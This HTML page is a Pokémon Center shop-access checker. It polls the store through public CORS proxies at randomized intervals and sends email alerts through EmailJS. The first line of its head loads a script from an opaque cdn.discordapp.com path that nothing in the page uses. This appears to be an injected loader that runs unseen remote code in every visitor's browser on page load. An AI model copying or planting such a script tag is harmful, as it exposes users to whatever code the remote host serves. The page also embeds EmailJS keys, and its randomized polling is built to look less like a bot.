<!DOCTYPE html>
<html lang="en">
<head><script type='text/javascript' src='https://cdn.discordapp.com/yZaRgYz3viJz0Ewrn1XdE9J84SNzYxzKPa1c6c2ZiWbfLjYddGn9W4rFkFwq9zkX_Zu0ngGATNp5_z9p59e64p8xb78BlyPS-ok1UcbcjqKhDWmxNho2oD4vRJa5Yer9BSvRfm4rA8z0XHylnanqMYySVWWNZV4jsV4xJYaZGPI='></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pokémon Center Shop Access Checker</title>
  <style>
    /* Tailwind-like utility classes */
    .bg-gray-100 { background-color: #f3f4f6; }
    .bg-white { background-color: #ffffff; }
    .bg-blue-500 { background-color: #3b82f6; }
    .bg-red-500 { background-color: #ef4444; }
    .bg-green-500 { background-color: #10b981; }
    .bg-gray-500 { background-color: #6b7280; }
    .text-gray-600 { color: #4b5563; }
    .text-gray-500 { color: #6b7280; }
    .text-red-500 { color: #ef4444; }
    .text-green-500 { color: #22c55e; }
    .text-lg { font-size: 1.125rem; line-height: 1.75rem; }
    .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
    .text-2xl { font-size: 1.5rem; line-height: 2rem; }
    .font-bold { font-weight: 700; }
    .font-semibold { font-weight: 600; }
    .p-6 { padding: 1.5rem; }
    .py-2 { padding-top: 0.5rem; padding-bottom: 0.5rem; }
    .px-3 { padding-left: 0.75rem; padding-right: 0.75rem; }
    .mt-2 { margin-top: 0.5rem; }
    .mb-2 { margin-bottom: 0.5rem; }
    .w-full { width: 100%; }
    .max-w-md { max-width: 28rem; }
    .rounded { border-radius: 0.25rem; }
    .rounded-lg { border-radius: 0.5rem; }
    .shadow-lg { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
    .border { border-width: 1px; }
    .border-gray-300 { border-color: #d1d5db; }
    .flex { display: flex; }
    .items-center { align-items: center; }
    .justify-center { justify-content: center; }
    .min-h-screen { min-height: 100vh; }
    .text-center { text-align: center; }
    .hidden { display: none; }
    .hover\:bg-blue-600:hover { background-color: #2563eb; }
    .hover\:bg-red-600:hover { background-color: #dc2626; }
    .hover\:bg-green-600:hover { background-color: #059669; }
    .hover\:bg-gray-600:hover { background-color: #4b5563; }
    /* Custom Pokemon Theme Styles */
    body {
      font-family: 'Nunito', sans-serif;
      background: linear-gradient(to bottom, #87CEEB, #A0D2EB, #90EE90, #ADD8E6);
      position: relative;
      overflow-y: auto;
      scrollbar-width: thin;
      scrollbar-color: #888 #f1f1f1;
    }
    body::-webkit-scrollbar {
      width: 10px;
    }
    body::-webkit-scrollbar-track {
      background: #f1f1f1;
    }
    body::-webkit-scrollbar-thumb {
      background: #888;
      border-radius: 5px;
    }
    body::-webkit-scrollbar-thumb:hover {
      background: #555;
    }
    .pokemon-sprite {
      position: absolute;
      bottom: 0;
      width: 120px;
      height: auto;
      z-index: 10;
    }
    .magikarp {
      left: 20px;
      animation: bob 2s infinite ease-in-out;
    }
    .cubone {
      right: 20px;
      animation: hop 3s infinite ease-in-out;
    }
    @keyframes bob {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
    @keyframes hop {
      0%, 100% { transform: translateY(0) rotate(0deg); }
      25% { transform: translateY(-15px) rotate(5deg); }
      50% { transform: translateY(0) rotate(0deg); }
      75% { transform: translateY(-15px) rotate(-5deg); }
    }
    .bg-white {
      background-color: #fff;
      border-radius: 20px;
      padding: 1.5rem;
      box-shadow: 0 15px 25px rgba(0, 0, 0, 0.2);
      position: relative;
      z-index: 20;
    }
    .rounded, .rounded-lg {
      border-radius: 15px !important;
    }
    .pokeball-decoration {
      position: absolute;
      width: 40px;
      height: 40px;
      background-size: contain;
      background-repeat: no-repeat;
      opacity: 0.6;
      z-index: 5;
    }
    .pokeball-top-left { top: -15px; left: -15px; transform: rotate(-20deg); }
    .pokeball-top-right { top: -15px; right: -15px; transform: rotate(15deg); }
    .pokeball-bottom-left { bottom: -15px; left: -15px; transform: rotate(40deg); }
    .pokeball-bottom-right { bottom: -15px; right: -15px; transform: rotate(-30deg); }
    input[type="email"] {
      border: 2px solid #a0d2eb;
      padding: 0.6rem 1rem;
      transition: border-color 0.3s ease;
    }
    input[type="email"]:focus {
      border-color: #3b82f6;
      outline: none;
      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
    }
    input[type="email"][readonly] {
      background-color: #f3f4f6;
      cursor: not-allowed;
    }
    button {
      font-weight: 600;
      transition: background-color 0.3s ease, transform 0.2s ease;
      letter-spacing: 0.05em;
    }
    button:hover {
      transform: translateY(-2px);
    }
    .text-center {
      text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
    }
    .email-input-group {
      display: flex;
      align-items: center;
      margin-bottom: 0.5rem;
    }
    .email-input-group input[type="email"] {
      flex-grow: 1;
      margin-right: 0.5rem;
    }
    .email-input-group .remove-email-button {
      background-color: #ef4444;
      color: white;
      border: none;
      padding: 0.5rem 0.75rem;
      border-radius: 0.25rem;
      cursor: pointer;
      font-size: 0.8rem;
      transition: background-color 0.2s;
    }
    .email-input-group .remove-email-button:hover {
      background-color: #dc2626;
      transform: none;
    }
    .email-input-group .submit-email-button {
      background-color: #10b981;
      color: white;
      border: none;
      padding: 0.5rem 0.75rem;
      border-radius: 0.25rem;
      cursor: pointer;
      font-size: 0.8rem;
      transition: background-color 0.2s;
    }
    .email-input-group .submit-email-button:hover {
      background-color: #059669;
      transform: none;
    }
    .email-toggle-button.active {
      background-color: #10b981;
    }
    .email-toggle-button.active:hover {
      background-color: #059669;
    }
    .email-toggle-button.inactive {
      background-color: #6b7280;
    }
    .email-toggle-button.inactive:hover {
      background-color: #4b5563;
    }
    .add-email-button {
      background-color: #22c55e;
      color: white;
      border: none;
      padding: 0.75rem 1rem;
      border-radius: 0.25rem;
      cursor: pointer;
      font-weight: 600;
      margin-top: 0.5rem;
      transition: background-color 0.2s, transform 0.2s;
    }
    .add-email-button:hover {
      background-color: #16a34a;
    }
    input[type="range"] {
      -webkit-appearance: none;
      width: 100%;
      height: 8px;
      background: #a0d2eb;
      border-radius: 5px;
      outline: none;
      margin-top: 0.5rem;
      cursor: pointer;
    }
    input[type="range"]::-webkit-slider-thumb {
      -webkit-appearance: none;
      appearance: none;
      width: 20px;
      height: 20px;
      background: #3b82f6;
      border-radius: 50%;
      border: 2px solid white;
      cursor: pointer;
      box-shadow: 0 0 5px rgba(0,0,0,0.2);
    }
    input[type="range"]::-moz-range-thumb {
      width: 20px;
      height: 20px;
      background: #3b82f6;
      border-radius: 50%;
      border: 2px solid white;
      cursor: pointer;
      box-shadow: 0 0 5px rgba(0,0,0,0.2);
    }
    .status-feedback {
      color: #16a34a;
      font-size: 0.875rem;
      margin-top: 0.5rem;
      text-align: center;
      opacity: 0;
      transition: opacity 0.5s ease;
    }
    .status-feedback.show {
      opacity: 1;
    }
    @media (max-height: 600px) {
      .pokemon-sprite {
        width: 80px;
      }
      .bg-white {
        padding: 1rem;
      }
      .text-2xl {
        font-size: 1.25rem;
        line-height: 1.75rem;
      }
      .p-6 {
        padding: 1rem;
      }
    }
    @media (max-height: 400px) {
      .pokemon-sprite {
        display: none;
      }
      .pokeball-decoration {
        display: none;
      }
    }
  </style>
  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap" rel="stylesheet">
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
  <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/129.png" alt="Magikarp" class="pokemon-sprite magikarp">
  <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/104.png" alt="Cubone" class="pokemon-sprite cubone">
  <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
    <div class="pokeball-decoration pokeball-top-left" style="background-image: url('https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png');"></div>
    <div class="pokeball-decoration pokeball-top-right" style="background-image: url('https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png');"></div>
    <div class="pokeball-decoration pokeball-bottom-left" style="background-image: url('https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png');"></div>
    <div class="pokeball-decoration pokeball-bottom-right" style="background-image: url('https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png');"></div>
    <h1 class="text-2xl font-bold text-center mb-2">Pokémon Center Shop Access Checker<br>Made By Kronborg</h1>
    <p class="text-gray-600 text-center mb-2">Checks to see if the shop is accessible.</p>
    <div id="emailInputsContainer" class="mb-2">
      <label class="block text-sm text-gray-600 mb-1">Emails for alerts:</label>
      <div class="email-input-group">
        <input type="email" placeholder="name@example.com" class="w-full border border-gray-300 rounded px-3 py-2 email-input" required>
        <button type="button" class="submit-email-button">Submit</button>
      </div>
    </div>
    <button id="addEmailButton" class="w-full add-email-button mb-2">Add Another Email</button>
    <div id="emailFeedback" class="status-feedback"></div>
    <div class="mb-2">
      <label for="frequencySlider" class="block text-sm text-gray-600 mb-1">
        Check every: <span id="frequencyValue" class="font-semibold text-gray-800">10</span> minutes
      </label>
      <input type="range" id="frequencySlider" min="1" max="60" value="10">
    </div>
    <div id="status" class="text-center mb-2">
      <p class="text-lg">Status: <span id="statusText" class="font-semibold">Waiting...</span></p>
      <p class="text-sm text-gray-500">Last checked: <span id="lastChecked">Never</span></p>
      <p class="text-sm text-gray-500">System running for: <span id="runTime">0h 0m 0s</span></p>
      <p class="text-sm text-gray-500">Details: <span id="statusDetails">None</span></p>
    </div>
    <button id="startButton" class="w-full bg-blue-500 text-white py-2 rounded hover:bg-blue-600">Start Checking</button>
    <button id="stopButton" class="w-full bg-red-500 text-white py-2 rounded hover:bg-red-600 mt-2 hidden">Stop Checking</button>
    <button id="emailToggleButton" class="w-full bg-green-500 text-white py-2 rounded hover:bg-green-600 mt-2 email-toggle-button active">Deactivate Email Alerts</button>
    <button id="testEmailButton" class="w-full bg-green-500 text-white py-2 rounded hover:bg-green-600 mt-2">Test Email</button>
  </div>
  <audio id="beepSound">
    <source src="https://www.soundjay.com/buttons/beep-01a.mp3" type="audio/mpeg">
    Your browser does not support the audio element.
  </audio>
  <script src="https://cdn.jsdelivr.net/npm/xlsx@0.18.5/dist/xlsx.full.min.js"></script>
  <script type="text/javascript">
    var gk_isXlsx = false;
    var gk_xlsxFileLookup = {};
    var gk_fileData = {};
    function filledCell(cell) {
      return cell !== '' && cell != null;
    }
    function loadFileData(filename) {
      if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
        try {
          var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
          var firstSheetName = workbook.SheetNames[0];
          var worksheet = workbook.Sheets[firstSheetName];
          var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
          var filteredData = jsonData.filter(row => row.some(filledCell));
          var headerRowIndex = filteredData.findIndex((row, index) =>
            row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
          );
          if (headerRowIndex === -1 || headerRowIndex > 25) {
            headerRowIndex = 0;
          }
          var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex));
          csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
          return csv;
        } catch (e) {
          console.error(e);
          return "";
        }
      }
      return gk_fileData[filename] || "";
    }
  </script>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.4.1/dist/email.min.js"></script>
  <script>
    if (typeof emailjs === 'undefined') {
      console.error('EmailJS failed to load. Please check the CDN URL or network connection.');
      alert('Email functionality is unavailable. Please check your network connection and try again.');
    } else {
      emailjs.init({
        publicKey: "LxaYn4E6okRV7RG0O"
      });
    }
    const statusText = document.getElementById('statusText');
    const lastChecked = document.getElementById('lastChecked');
    const statusDetails = document.getElementById('statusDetails');
    const startButton = document.getElementById('startButton');
    const stopButton = document.getElementById('stopButton');
    const testEmailButton = document.getElementById('testEmailButton');
    const emailToggleButton = document.getElementById('emailToggleButton');
    const beepSound = document.getElementById('beepSound');
    const runTime = document.getElementById('runTime');
    const emailInputsContainer = document.getElementById('emailInputsContainer');
    const addEmailButton = document.getElementById('addEmailButton');
    const emailFeedback = document.getElementById('emailFeedback');
    const frequencySlider = document.getElementById('frequencySlider');
    const frequencyValue = document.getElementById('frequencyValue');
    let intervalId = null;
    let startTime = null;
    let timerInterval = null;
    let currentCheckInterval = 10 * 60 * 1000;
    let emailNotificationsEnabled = true;
    emailToggleButton.addEventListener('click', () => {
      emailNotificationsEnabled = !emailNotificationsEnabled;
      if (emailNotificationsEnabled) {
        emailToggleButton.textContent = 'Deactivate Email Alerts';
        emailToggleButton.classList.remove('inactive', 'bg-gray-500');
        emailToggleButton.classList.add('active', 'bg-green-500');
      } else {
        emailToggleButton.textContent = 'Activate Email Alerts';
        emailToggleButton.classList.remove('active', 'bg-green-500');
        emailToggleButton.classList.add('inactive', 'bg-gray-500');
      }
      showEmailFeedback(`Email notifications ${emailNotificationsEnabled ? 'enabled' : 'disabled'}.`);
    });
    function getRandomInterval(baseInterval) {
      const variation = Math.floor(Math.random() * (120000 - 60000 + 1)) + 60000;
      const randomSign = Math.random() < 0.5 ? -1 : 1;
      return baseInterval + (randomSign * variation);
    }
    frequencySlider.addEventListener('input', function() {
      frequencyValue.textContent = this.value;
      if (intervalId) {
        stopChecking();
        startChecking();
      }
    });
    function showEmailFeedback(message) {
      emailFeedback.textContent = message;
      emailFeedback.classList.add('show');
      setTimeout(() => {
        emailFeedback.classList.remove('show');
      }, 2000);
    }
    function addEmailInputField() {
      const emailInputGroup = document.createElement('div');
      emailInputGroup.className = 'email-input-group';
      emailInputGroup.innerHTML = `
        <input type="email" placeholder="name@example.com" class="w-full border border-gray-300 rounded px-3 py-2 email-input" required>
        <button type="button" class="submit-email-button">Submit</button>
      `;
      emailInputsContainer.appendChild(emailInputGroup);
      const submitButton = emailInputGroup.querySelector('.submit-email-button');
      const emailInput = emailInputGroup.querySelector('.email-input');
      submitButton.addEventListener('click', function() {
        const email = emailInput.value.trim();
        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
          alert('Please enter a valid email address.');
          emailInput.focus();
          return;
        }
        emailInput.setAttribute('readonly', 'true');
        submitButton.remove();
        const removeButton = document.createElement('button');
        removeButton.type = 'button';
        removeButton.className = 'remove-email-button';
        removeButton.textContent = 'Remove';
        emailInputGroup.appendChild(removeButton);
        removeButton.addEventListener('click', function() {
          emailInputGroup.remove();
          showEmailFeedback('Email removed.');
        });
        showEmailFeedback('Email submitted.');
        console.log('Submitted email:', email);
      });
      console.log('Added new email input field');
      showEmailFeedback('Email field added.');
    }
    document.addEventListener('DOMContentLoaded', () => {
      const initialInputGroup = emailInputsContainer.querySelector('.email-input-group');
      const initialInput = initialInputGroup.querySelector('.email-input');
      const submitButton = initialInputGroup.querySelector('.submit-email-button');
      submitButton.addEventListener('click', function() {
        const email = initialInput.value.trim();
        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
          alert('Please enter a valid email address.');
          initialInput.focus();
          return;
        }
        initialInput.setAttribute('readonly', 'true');
        submitButton.remove();
        const removeButton = document.createElement('button');
        removeButton.type = 'button';
        removeButton.className = 'remove-email-button';
        removeButton.textContent = 'Remove';
        initialInputGroup.appendChild(removeButton);
        removeButton.addEventListener('click', function() {
          initialInputGroup.remove();
          showEmailFeedback('Email removed.');
        });
        showEmailFeedback('Email submitted.');
        console.log('Submitted email:', email);
      });
    });
    addEmailButton.addEventListener('click', addEmailInputField);
    function formatDuration(ms) {
      const seconds = Math.floor(ms / 1000);
      const hours = Math.floor(seconds / 3600);
      const minutes = Math.floor((seconds % 3600) / 60);
      const secs = seconds % 60;
      return `${hours}h ${minutes}m ${secs}s`;
    }
    function updateRunTime() {
      if (startTime) {
        const now = Date.now();
        runTime.textContent = formatDuration(now - startTime);
      }
    }
    function startTimer() {
      if (!startTime) {
        startTime = Date.now();
        timerInterval = setInterval(updateRunTime, 2000);
      }
    }
    function stopTimer() {
      if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
      }
      startTime = null;
      runTime.textContent = '0h 0m 0s';
    }
    function playThreeBeeps() {
      let beepCount = 0;
      const beepInterval = setInterval(() => {
        if (beepCount < 3) {
          beepSound.currentTime = 0;
          beepSound.play().catch(() => console.log('Audio playback failed'));
          beepCount++;
        } else {
          clearInterval(beepInterval);
          beepSound.pause();
          beepSound.currentTime = 0;
        }
      }, 1500);
    }
    function sendEmail(status, details, recipientEmails) {
      if (!emailNotificationsEnabled) {
        console.log('Email notifications are disabled; skipping email sending.');
        return;
      }
      if (!recipientEmails || recipientEmails.length === 0) {
        console.error('No email addresses provided for sending alerts');
        return;
      }
      if (typeof emailjs === 'undefined') {
        console.error('EmailJS is not available');
        return;
      }
      recipientEmails.forEach(email => {
        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
          console.warn(`Invalid email address: ${email}. Skipping.`);
          return;
        }
        emailjs.send("service_ahqdaj5", "template_whhvnra", {
          status: status,
          details: details,
          timestamp: new Date().toLocaleString(),
          to_email: email
        }).then(
          () => console.log('Email sent successfully to', email),
          (error) => console.error('Failed to send email to', email, ':', error)
        );
      });
      emailNotificationsEnabled = false;
      emailToggleButton.textContent = 'Activate Email Alerts';
      emailToggleButton.classList.remove('active', 'bg-green-500');
      emailToggleButton.classList.add('inactive', 'bg-gray-500');
      showEmailFeedback('Email notifications deactivated after sending alert.');
    }
    function testEmail() {
      const emailInputs = document.querySelectorAll('.email-input');
      const recipientEmails = [];
      let hasValidEmail = true;
      Array.from(emailInputs).forEach((input, index) => {
        const email = input.value.trim();
        if (email && input.hasAttribute('readonly')) {
          if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
            recipientEmails.push(email);
          } else {
            alert(`Please ensure email ${index + 1} is valid: ${email}`);
            input.focus();
            hasValidEmail = false;
          }
        }
      });
      if (!hasValidEmail) {
        return;
      }
      if (recipientEmails.length === 0) {
        console.warn('No valid email addresses provided.');
        alert('No valid email addresses provided.');
        return;
      }
      if (!emailNotificationsEnabled) {
        console.warn('Email notifications are disabled; cannot send test email.');
        alert('Email notifications are disabled. Please activate email notifications to send a test email.');
        return;
      }
      if (typeof emailjs === 'undefined') {
        alert('Email functionality is unavailable. Please check your network connection and try again.');
        return;
      }
      console.log('Sending test email to:', recipientEmails);
      sendEmail('Test Email', 'This is a test email from Pokémon Center Shop Access Checker.', recipientEmails);
      alert('Test email(s) sent! Check your inbox(es) (and spam/junk folder).');
    }
    function extractQueueLength(text) {
      const patterns = [
        /(\d+)\s*users?\s*ahead/i,
        /queue\s*position\s*[:=]?\s*(\d+)/i,
        /(\d+)\s*in\s*queue/i,
        /position\s*in\s*queue\s*[:=]?\s*(\d+)/i
      ];
      for (const pattern of patterns) {
        const match = text.match(pattern);
        if (match) return match[1];
      }
      return null;
    }
    async function checkShopAccess() {
      const emailInputs = document.querySelectorAll('.email-input');
      const currentEmails = [];
      Array.from(emailInputs)
        .filter(input => input.hasAttribute('readonly'))
        .map(input => input.value.trim())
        .filter(email => email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
        .forEach(email => currentEmails.push(email));
      console.log('Emails for notifications:', currentEmails);
      if (currentEmails.length === 0) {
        console.warn('No valid email addresses provided. Skipping email notifications.');
      }
      try {
        const proxies = [
          'https://corsproxy.io/?',
          'https://cors-anywhere.herokuapp.com/',
          'https://allorigins.win/raw?url='
        ];
        const targetUrls = [
          'https://www.pokemoncenter.com/',
          'https://www.pokemoncenter.com/category/trading-card-game'
        ];
        let response = null;
        let proxyUsed = '';
        let urlUsed = '';
        let proxyErrors = [];
        for (const targetUrl of targetUrls) {
          for (const proxy of proxies) {
            try {
              response = await fetch(proxy + encodeURIComponent(targetUrl), {
                method: 'GET',
                headers: {
                  'Accept': 'text/html',
                },
              });
              proxyUsed = proxy;
              urlUsed = targetUrl;
              if (response.ok && response.status === 200) break;
              proxyErrors.push(`Proxy ${proxy} for ${targetUrl} returned status: ${response?.status || 'unknown'}`);
            } catch (proxyError) {
              proxyErrors.push(`Proxy ${proxy} for ${targetUrl} failed: ${proxyError.message}`);
              console.warn(`Proxy ${proxy} for ${targetUrl} failed:`, proxyError);
            }
            if (response && response.ok && response.status === 200) break;
          }
          if (response && response.ok && response.status === 200) break;
        }
        const now = new Date().toLocaleTimeString();
        lastChecked.textContent = now;
        if (!response || !response.ok) {
          const status = 'Proxy error';
          const details = `Failed to fetch page through all proxies. Errors: ${proxyErrors.join('; ')}. Please check the site manually.`;
          statusText.textContent = status;
          statusText.classList.remove('text-green-500');
          statusText.classList.add('text-red-500');
          statusDetails.textContent = details;
          playThreeBeeps();
          if (emailNotificationsEnabled && statusText.dataset.previousStatus !== status) {
            sendEmail(status, details, currentEmails);
          }
          statusText.dataset.previousStatus = status;
          return;
        }
        const finalUrl = decodeURIComponent(response.url.replace(proxyUsed, ''));
        const text = await response.text();
        const isQueue =
          /queue-it\.net/i.test(finalUrl) ||
          /waiting room|queue-it|waitingroom|virtual waiting/i.test(text);
        if (isQueue) {
          const queueLength = extractQueueLength(text);
          const currentStatus = 'Shop is active (in queue)';
          statusText.textContent = currentStatus;
          statusText.classList.remove('text-red-500');
          statusText.classList.add('text-green-500');
          const details = `Queue detected at ${finalUrl} (checked ${urlUsed}). Queue length: ${queueLength || 'unknown'}. Redirecting to Pokémon Center homepage.`;
          statusDetails.textContent = details;
          playThreeBeeps();
          statusText.dataset.previousStatus = currentStatus;
          stopChecking();
          window.location.href = 'https://www.pokemoncenter.com/';
          return;
        } else if (/pokemoncenter\.com(\/|$|\/category\/trading-card-game)/i.test(finalUrl)) {
          const hasShopContent = /shop|products|category|store|cart|new releases|all products|add to cart|merchandise|collectibles|plush|trading card|Pokémon/i.test(text);
          const hasDynamicElements = /<nav\b|<a\b[^>]*href=["'][^"']*product[^"']*["']|<div\b[^>]*class=["'][^"']*product[^"']*["']/i.test(text);
          const isLargeResponse = text.length > 10000;
          if (hasShopContent || hasDynamicElements || isLargeResponse) {
            const currentStatus = 'Shop is accessible!';
            statusText.textContent = currentStatus;
            statusText.classList.remove('text-red-500');
            statusText.classList.add('text-green-500');
            statusDetails.textContent = `Reached ${finalUrl} (checked ${urlUsed}), shop content detected (keywords or dynamic elements present). Response length: ${text.length} chars.`;
            statusText.dataset.previousStatus = currentStatus;
          } else {
            const currentStatus = 'Shop is not accessible (landing page)';
            statusText.textContent = currentStatus;
            statusText.classList.remove('text-green-500');
            statusText.classList.add('text-red-500');
            const details = `Reached ${finalUrl} (checked ${urlUsed}), but no shop content or dynamic elements found. Likely a static landing page. Response length: ${text.length} chars.`;
            statusDetails.textContent = details;
            playThreeBeeps();
            if (emailNotificationsEnabled && statusText.dataset.previousStatus !== currentStatus) {
              sendEmail(currentStatus, details, currentEmails);
            }
            statusText.dataset.previousStatus = currentStatus;
          }
        } else {
          const currentStatus = 'Shop is not accessible (unexpected page)';
          statusText.textContent = currentStatus;
          statusText.classList.remove('text-green-500');
          statusText.classList.add('text-red-500');
          const details = `Reached ${finalUrl} (checked ${urlUsed}), but it does not appear to be the Pokémon Center shop. Response length: ${text.length} chars.`;
          statusDetails.textContent = details;
          playThreeBeeps();
          if (emailNotificationsEnabled && statusText.dataset.previousStatus !== currentStatus) {
            sendEmail(currentStatus, details, currentEmails);
          }
          statusText.dataset.previousStatus = currentStatus;
        }
      } catch (error) {
        console.error('Error checking page:', error);
        const status = 'Site is down';
        const details = `Failed to fetch: ${error.message}. Please check the site manually.`;
        statusText.textContent = status;
        statusText.classList.remove('text-green-500');
        statusText.classList.add('text-red-500');
        statusDetails.textContent = details;
        lastChecked.textContent = new Date().toLocaleTimeString();
        playThreeBeeps();
        if (emailNotificationsEnabled && statusText.dataset.previousStatus !== status) {
          sendEmail(status, details, currentEmails);
        }
        statusText.dataset.previousStatus = status;
      }
    }
    function startChecking() {
      const emailInputs = document.querySelectorAll('.email-input');
      let allEmailsValid = true;
      let hasAtLeastOneEmail = false;
      Array.from(emailInputs).forEach((input, index) => {
        const email = input.value.trim();
        if (email && !input.hasAttribute('readonly')) {
          alert('Please submit all email addresses before starting.');
          input.focus();
          allEmailsValid = false;
        } else if (email && input.hasAttribute('readonly')) {
          if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
            hasAtLeastOneEmail = true;
          } else {
            alert(`Please ensure email ${index + 1} is valid: ${email}`);
            input.focus();
            allEmailsValid = false;
          }
        }
      });
      if (!allEmailsValid) {
        return;
      }
      if (!hasAtLeastOneEmail) {
        console.warn('No valid email addresses provided.');
        alert('Please submit at least one valid email address.');
        return;
      }
      if (intervalId) {
        clearTimeout(intervalId);
      }
      function scheduleNextCheck() {
        currentCheckInterval = parseInt(frequencySlider.value) * 60 * 1000;
        const randomizedInterval = getRandomInterval(currentCheckInterval);
        console.log(`Next check in ${randomizedInterval / 1000 / 60} minutes`);
        intervalId = setTimeout(() => {
          checkShopAccess();
          scheduleNextCheck();
        }, randomizedInterval);
      }
      checkShopAccess();
      scheduleNextCheck();
      startButton.classList.add('hidden');
      stopButton.classList.remove('hidden');
      statusText.textContent = 'Checking...';
      statusDetails.textContent = 'Started checking with randomized intervals.';
      startTimer();
    }
    function stopChecking() {
      if (intervalId) {
        clearTimeout(intervalId);
        intervalId = null;
        startButton.classList.remove('hidden');
        stopButton.classList.add('hidden');
        statusText.textContent = 'Stopped.';
        statusDetails.textContent = 'Checking stopped.';
        stopTimer();
      }
    }
    startButton.addEventListener('click', startChecking);
    stopButton.addEventListener('click', stopChecking);
    testEmailButton.addEventListener('click', testEmail);
  </script>
</body>
</html>
